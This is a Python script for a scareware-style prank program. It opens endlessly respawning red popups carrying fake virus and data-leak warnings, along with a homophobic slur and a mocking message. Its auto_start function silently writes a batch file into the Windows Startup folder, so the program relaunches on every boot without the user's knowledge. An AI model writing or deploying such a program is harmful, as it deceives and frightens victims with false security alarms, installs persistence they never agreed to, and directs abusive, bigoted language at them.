import tkinter as tk
import threading
import time
import random
import os
import platform
import sys

# Function to display a single popup
def show_popup(title, message, x, y, size, color, btn1_text, callback):
    def popup_thread():
        root = tk.Tk()
        root.withdraw()

        popup = tk.Toplevel(root)
        popup.title(title)
        popup.configure(bg=color)
        popup.geometry(f"{size}x{size}+{x}+{y}")

        tk.Label(popup, text=message, bg=color, wraplength=size-40).pack(pady=20, padx=20)
        btn1 = tk.Button(popup, text=btn1_text, command=lambda: (popup.quit(), callback()))
        btn1.pack(pady=10)

        # Bind the window close event to the callback function
        popup.protocol("WM_DELETE_WINDOW", lambda: (popup.quit(), callback()))

        popup.mainloop()
        root.quit()

    threading.Thread(target=popup_thread).start()

# Function to get a new random position
def get_random_position(size, screen_width, screen_height):
    x = random.randint(0, screen_width - size)
    y = random.randint(0, screen_height - size)
    return x, y

# Function to display and manage popups
def manage_popups(messages, size, color, btn1_text, delay, max_popups):
    screen_width = tk.Tk().winfo_screenwidth()
    screen_height = tk.Tk().winfo_screenheight()
    
    message_index = 0
    popups_open = []

    def popup_callback():
        nonlocal message_index
        if len(popups_open) < max_popups:
            x, y = get_random_position(size, screen_width, screen_height)
            message = messages[message_index]
            message_index = (message_index + 1) % len(messages)
            popup = threading.Thread(target=show_popup, args=("Alert!", message, x, y, size, color, btn1_text, popup_callback))
            popup.start()
            popups_open.append(popup)
        else:
            time.sleep(delay)

    # Create initial set of popups
    for _ in range(max_popups):
        popup_callback()

    # Keep track of open popups
    while len(popups_open) > 0:
        for popup in list(popups_open):
            if not popup.is_alive():
                popups_open.remove(popup)
        time.sleep(delay)

# Function to auto-start the script on system boot (Windows example)
def auto_start():
    if platform.system() == "Windows":
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        script_path = os.path.realpath(__file__)
        bat_path = os.path.join(startup_dir, "popup_service.bat")
        with open(bat_path, 'w') as bat_file:
            bat_file.write(f'start /min pythonw {script_path}')

# Main function
if __name__ == '__main__':
    auto_start()  # Ensure the script auto-starts on system boot

    # Define default values
    size = 200  # Width and height of each popup
    color = "#FF0000"  # Red color for urgency
    btn1_text = "OK"
    delay = 0.1  # 0.1-second delay before reopening a new popup
    max_popups = 10  # Maximum number of popups to show

    # Define custom messages related to virus attacks and information leaks
    messages = [
        "Your PC is being attacked by a virus!",
        "Your personal information might be leaked!",
        "Unauthorized access detected on your system!",
        "Malware detected! Immediate action required!",
        "Suspicious activity detected on your PC!",
        "FAGGOT",
        "Virus detected! Your data could be compromised!",
        "Security breach detected! Protect your information!",
        "System vulnerability identified!",
        "YOU ARE GAY!"
    ]

    # Run the popups in a separate thread
    threading.Thread(target=manage_popups, args=(messages, size, color, btn1_text, delay, max_popups)).start()
